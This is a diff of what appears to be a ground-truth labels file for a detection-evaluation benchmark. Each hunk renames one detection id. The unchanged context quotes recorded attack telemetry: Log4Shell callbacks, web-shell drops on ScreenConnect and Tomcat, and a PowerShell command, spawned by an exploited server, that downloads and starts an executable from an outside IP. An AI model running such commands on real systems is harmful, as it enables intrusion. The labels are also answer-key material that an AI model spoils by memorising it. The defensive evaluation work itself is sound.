@@ -2006,7 +2006,7 @@
    "summary": "One Sysmon 1 record: the CrushFTP service (C:\\Program Files\\CrushFTP10\\crushftpservice.exe) spawns 'cmd.exe /c whoami' as WIN-HOST-MHAAG-\\Administrator (High integrity), i.e. post-exploitation recon from an exploited public-facing CrushFTP server. No other telemetry.",
    "labels": [
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "scope",
      "evidence": [
       "EventRecordID 13208447: Sysmon 1, ParentImage C:\\Program Files\\CrushFTP10\\crushftpservice.exe -> Image C:\\Windows\\System32\\cmd.exe (OriginalFileName Cmd.Exe), CommandLine 'cmd.exe /c whoami', User WIN-HOST-MHAAG-\\Administrator",
@@ -2062,7 +2062,7 @@
      "reason": "The reverse shell the exploited Java process spawns is Unix-shell execution (T1059.004), but it is outside the documented scope. No Base64 is decoded into a shell (susp_b64_pipe). The binary is /bin/bash, not under /tmp, /var/tmp or /dev/shm (susp_tmp_binary). The shell's first argument is -c, not a temp-directory script (tmp_script_shell/tmp_script_path)."
     },
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "telemetry",
      "evidence": [
       "Linux Sysmon 3 RID 34917811 (#8199): java pid 25020 accepts 10.0.1.16:54192 -> 10.0.1.25:8080; RID 34917812/34917813: java -> 10.0.1.16:1389 and 10.0.1.16:8080; repeated at 21:16:22 (RID 34918211, 34918230)",
@@ -2088,7 +2088,7 @@
    "summary": "Splunk classic Security log (28,794 records, mostly 5156; win-dc-128 and win-host-987, 2021-12-15 20:40:16-20:45:15). It comes from the same run and window as H93. It holds Splunk forwarder child processes, a SIHClient run, and an RDP logon of ATTACKRANGE\\Administrator from 72.43.121.35 (4624 type 10, 4648, 4776, AES 4768/4769). The rest is machine-account network logons, SYSVOL reads and DC WFP connections. There is no trace of the Log4Shell activity: no java process creation, and no event mentions 10.0.1.16. Nothing falls in any detection's documented scope:\n- the only 4769 (Rec 1621635347) is AES 0x12 for the machine account WIN-HOST-987$;\n- the only 4768 (Rec 1621635345) succeeded (0x0);\n- there are no 4771 or 4625 failures and no 1102;\n- none of the 80 4688 records matches a process-creation selection.",
    "labels": [
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "telemetry",
      "evidence": [
       "Full-text search: no event mentions 10.0.1.16; no 4688 for java; 5156/5158 come only from win-dc-128 (splunkd, streamfwd, dns, lsass, ...)",
@@ -2115,7 +2115,7 @@
    "summary": "Sysmon (4,458 records, win-dc-128 and win-host-987, 2021-12-15 20:40:10-20:45:09). It records the Log4Shell callback on win-host-987: java.exe (pid 1068, ATTACKRANGE\\Administrator) accepts 10.0.1.16:38332 -> 10.0.1.15:8080, then connects to 10.0.1.16:1389 (LDAP) and 10.0.1.16:8080 at 20:43:21. No child process of java is recorded. The rest is background:\n- all 78 EID 1 are Splunk forwarder helpers or the RDP logon chain (smss, csrss, winlogon, LogonUI, dwm, rdpclip, atbroker, TSTheme);\n- the only LSASS handles are svchost (lsm.dll) with 0x1400/0x101001, which lack PROCESS_VM_READ, so they are not in T1003.001's scope;\n- registry writes are W32Time, DFSR and terminal-input, with no Run keys;\n- the DC shows LDAP, Kerberos and DNS traffic.",
    "labels": [
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "telemetry",
      "evidence": [
       "Sysmon 3 RID 64848551 (#3446): java.exe pid 1068 accepts 10.0.1.16:38332 -> 10.0.1.15:8080 (Initiated false)",
@@ -2151,7 +2151,7 @@
      "reason": "PowerShell (by path and OriginalFileName) started with -EncodedCommand and a 32-char Base64 argument by the exploited PaperCut server, which is the documented case; the parent is not a filtered configuration-management tool (SCCM, Intune, RMM), and no documented blind spot applies. The Base64 is wrapped in double quotes, and the README does not list that as an exclusion."
     },
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "scope",
      "evidence": [
       "EventRecordID 128237990: Sysmon 1, ParentImage C:\\Program Files\\PaperCut NG\\runtime\\win64\\jre\\bin\\pc-app.exe (SYSTEM) -> powershell.exe -EncodedCommand \"<Base64, 32 chars>\"",
@@ -2232,7 +2232,7 @@
    "summary": "Security 4663 x8 (file object access) on ScreenConnect server ar-win-2: ScreenConnect.Service.exe (subject AR-WIN-2\\Administrator) writes 'evilapp - Copy.aspx' and 'evilapp - Copy (2).aspx' directly into ScreenConnect\\App_Extensions. This is the web-shell drop that follows ScreenConnect exploitation (extension path traversal).",
    "labels": [
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "scope",
      "evidence": [
       "EventRecordIDs 10525827-10525831: 4663, ProcessName C:\\Program Files (x86)\\ScreenConnect\\Bin\\ScreenConnect.Service.exe, ObjectName ...\\ScreenConnect\\App_Extensions\\evilapp - Copy.aspx, AccessMask 0x2/0x4/0x80/0x100 (WriteData, AppendData, attributes)",
@@ -2260,7 +2260,7 @@
    "summary": "Two Sysmon 11 records on ar-win-2: ScreenConnect.Service.exe creates 'evilapp - Copy.aspx' and 'evilapp - Copy (2).aspx' in ScreenConnect\\App_Extensions. This is the same web-shell drop through ScreenConnect exploitation as H99, seen as file creation.",
    "labels": [
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "scope",
      "evidence": [
       "EventRecordID 19347491: Sysmon 11, Image C:\\Program Files (x86)\\ScreenConnect\\Bin\\ScreenConnect.Service.exe, TargetFilename ...\\ScreenConnect\\App_Extensions\\evilapp - Copy.aspx",
@@ -2297,7 +2297,7 @@
      "reason": "The attack runs PowerShell (download and Start-Process) with a plain, unobfuscated command line; the detection's scope is only a dash-like -e/-ec/-en* switch followed by a 16+ char Base64 blob, and the powershell.exe process record itself is absent (only its cmd.exe parent)."
     },
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "scope",
      "evidence": [
       "EventRecordID 18061 (ordinal 1, duplicated at 12): Sysmon 1, ParentImage C:\\Program Files\\Java\\jdk-17\\bin\\java.exe (ActiveMQ) -> cmd.exe 'cmd /c \"powershell Invoke-WebRequest \"http://192.168.196.163/test.exe\" -OutFile \"test.exe\"; Start-Pr...'",
@@ -2344,7 +2344,7 @@
      "reason": "Exploited services run Unix shell commands (T1059.004), but none is in the documented scope:\n- no Base64 is decoded; RocketMQ pipes plain `echo` output into sh (susp_b64_pipe needs a Base64 decode piped into the shell);\n- the downloaded ELF is written to and run from the ActiveMQ working directory, not /tmp, /var/tmp or /dev/shm (the README lists other writable directories as a coverage gap), and its own process start is not recorded;\n- each shell's first argument is -c or nothing, not a temp-directory script."
     },
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "telemetry",
      "evidence": [
       "EventRecordID 529 (#3): Linux Sysmon 11, /opt/splunk/bin/splunkd creates /opt/splunk/var/run/splunk/dispatch/1702318424.15/shell.xsl",
@@ -2382,7 +2382,7 @@
      "reason": "A web-app RCE running a Base64 dropper through sh -c is T1059.004 behaviour, but this record is outside the documented scope:\n- the decoded output is redirected into a file, not piped into sh/bash/dash/zsh/ksh (susp_b64_pipe);\n- Image /bin/dash is not under a temp directory (susp_tmp_binary);\n- the shell's first argument is -c, not a temp-directory script (tmp_script_shell/tmp_script_path).\nThe next step, starting /tmp/mBZXM, would match susp_tmp_binary, but its process creation is not in this Java-filtered export."
     },
     {
-     "detection": "T1190_api_auth_probing",
+     "detection": "T1595.003_api_auth_probing",
      "label": "telemetry",
      "evidence": [
       "EventRecordID 376726 / 376864 (#136/#135): Linux Sysmon 11, java (user tomcat) creates .../webapps/ROOT/shell_.jsp and .../ROOT/shell.jsp (2022-04-05 16:10:24 / 16:10:28)",
